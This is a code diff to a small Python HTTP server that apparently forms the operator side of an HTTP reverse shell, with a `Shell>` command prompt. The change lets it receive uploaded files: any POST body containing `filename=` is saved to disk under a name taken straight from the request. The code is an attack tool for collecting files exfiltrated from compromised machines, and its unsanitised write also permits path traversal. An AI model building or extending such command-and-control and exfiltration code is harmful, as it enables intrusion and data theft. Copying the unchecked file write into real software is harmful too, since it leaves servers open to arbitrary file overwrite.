@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import http.server as http_server
-
+import re
 #Python 3
 #HTTP server
 
@@ -22,7 +22,18 @@ class MyHandler(http_server.BaseHTTPRequestHandler):
         self.end_headers()
         length = int(self.headers['Content-length'])
         _post = self.rfile.read(length)
-        print(_post.decode())
+        response = _post.decode()
+        print(response)
+        if "filename=" in response:
+            filename = extract_filename(response)
+            with open(filename, 'w') as f:
+                f.write(response)
+
+def extract_filename(text):
+    matches = re.split('\r\n', text)
+    match = re.search("(filename=\"\w.*)$" , matches[1])
+    attr, filename, _ = match[0].split('"')
+    return filename
 
 def check_input():
     command = input("Shell> ")
